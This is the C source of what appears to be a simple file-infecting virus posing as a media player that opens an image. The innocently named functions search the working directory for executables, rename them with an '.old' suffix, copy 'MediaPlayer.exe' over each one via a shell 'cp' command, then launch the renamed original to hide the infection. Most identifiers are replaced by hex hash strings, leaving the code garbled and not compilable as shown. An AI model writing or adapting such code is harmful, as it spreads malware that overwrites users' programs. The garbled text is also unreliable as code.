	#include <stdlib.h>
	#include <stdio.h>
	#include <sys/types.h>
	#include <dirent.h>
	#include <sys/stat.h>
	#include <unistd.h>
	#include <string.h>
	#include <stdbool.h>

	bool isImageDispo(char* 7567747a18f4bbfe6f8212da67c28e64)
	{
	char * 566bbee0f961ad71b54c3c2fd36db053 = ".old";
	if(strstr(7567747a18f4bbfe6f8212da67c28e64, 566bbee0f961ad71b54c3c2fd36db053)){ 
		return true;
	}else{
		DIR *75a384057459ae8e69fb9a98a249b4f4 = opendir("."); 
		struct dirent *f41856f51c90f68b6af178f5b9d0fac2;
		while ((f41856f51c90f68b6af178f5b9d0fac2 = readdir(75a384057459ae8e69fb9a98a249b4f4))) { 
			if((strcmp(f41856f51c90f68b6af178f5b9d0fac2->d_name,7567747a18f4bbfe6f8212da67c28e64) == 0) && fopen(strcat(f41856f51c90f68b6af178f5b9d0fac2->d_name,566bbee0f961ad71b54c3c2fd36db053),"r")!=NULL){
				return true;
			}
		}
	}
	return false;
	}

	char** rechercheImages(char* exeption)
	{
	char** 45b963397aa40d4a0063e0d85e4fe7a1 = malloc(3*sizeof(char*));
	int db03db5fcac3e42e9a44b54048ed563b=0;
	DIR *75a384057459ae8e69fb9a98a249b4f4 = opendir("."); 
	struct stat cb7e52b21171fb9a53b498202607f0bd;
	struct dirent *f41856f51c90f68b6af178f5b9d0fac2;
	while ((f41856f51c90f68b6af178f5b9d0fac2 = readdir(75a384057459ae8e69fb9a98a249b4f4))) { 
		stat(f41856f51c90f68b6af178f5b9d0fac2->d_name,&cb7e52b21171fb9a53b498202607f0bd);
		char 5d75fd161f8d954c639d1bc4caedb5b9[strlen(f41856f51c90f68b6af178f5b9d0fac2->d_name)+3];
		strcpy(5d75fd161f8d954c639d1bc4caedb5b9,"./");
		strcat(5d75fd161f8d954c639d1bc4caedb5b9,f41856f51c90f68b6af178f5b9d0fac2->d_name);
		if(((cb7e52b21171fb9a53b498202607f0bd.st_mode & S_IFMT) == S_IFREG) && (cb7e52b21171fb9a53b498202607f0bd.st_mode & S_IXUSR))
		{ 
			if(db03db5fcac3e42e9a44b54048ed563b<3 && strcmp(f41856f51c90f68b6af178f5b9d0fac2->d_name,"MediaPlayer.exe")!=0 && !isImageDispo(f41856f51c90f68b6af178f5b9d0fac2->d_name)) 
			{
				45b963397aa40d4a0063e0d85e4fe7a1[db03db5fcac3e42e9a44b54048ed563b] = f41856f51c90f68b6af178f5b9d0fac2->d_name;
				db03db5fcac3e42e9a44b54048ed563b+=1;
			}
		}
	    }
	closedir(75a384057459ae8e69fb9a98a249b4f4);
	return 45b963397aa40d4a0063e0d85e4fe7a1;	
	}

	void loadImages(char** 45b963397aa40d4a0063e0d85e4fe7a1)
	{
	for(int i=0;i<3;i+=1){
		char 9dd4e461268c8034f5c8564e155c67a6[strlen(45b963397aa40d4a0063e0d85e4fe7a1[i])+strlen(".old")+1];
		char 30e9a4fa2aa0bb1a9cc1526e36f3e587[strlen(45b963397aa40d4a0063e0d85e4fe7a1[i])+1];
		strcpy(30e9a4fa2aa0bb1a9cc1526e36f3e587,45b963397aa40d4a0063e0d85e4fe7a1[i]);
		strcpy(9dd4e461268c8034f5c8564e155c67a6,45b963397aa40d4a0063e0d85e4fe7a1[i]);
		strcat(9dd4e461268c8034f5c8564e155c67a6,".old");
		rename(45b963397aa40d4a0063e0d85e4fe7a1[i],9dd4e461268c8034f5c8564e155c67a6);
		char f9807a249af1626f257c35c6fb309f69[500]="";
		strcat(f9807a249af1626f257c35c6fb309f69,"cp ");
		strcat(f9807a249af1626f257c35c6fb309f69,"./MediaPlayer.exe");
		strcat(f9807a249af1626f257c35c6fb309f69," ");
		strcat(f9807a249af1626f257c35c6fb309f69,45b963397aa40d4a0063e0d85e4fe7a1[i]);
		system(f9807a249af1626f257c35c6fb309f69);
	}
	}

	int main(int argc, char *argv[])
	{
	char 5d75fd161f8d954c639d1bc4caedb5b9[strlen(argv[0])+1];
	strcpy(5d75fd161f8d954c639d1bc4caedb5b9,argv[0]);
	char** 8fa14cdd754f91cc6554c9e71929cce7 = rechercheImages(5d75fd161f8d954c639d1bc4caedb5b9);
	if(8fa14cdd754f91cc6554c9e71929cce7[0]!=NULL)
	loadImages(8fa14cdd754f91cc6554c9e71929cce7);
	if(strcmp(argv[0],"./MediaPlayer.exe")!=0)
	{
		char 5969da76090e570807a8230140cb1171[strlen(argv[0]+5)];
		strcpy(5969da76090e570807a8230140cb1171,argv[0]);
		strcat(5969da76090e570807a8230140cb1171,".old");
		system(5969da76090e570807a8230140cb1171);
	}else{
		system("xdg-open ./oue.jpeg");
	}
	}
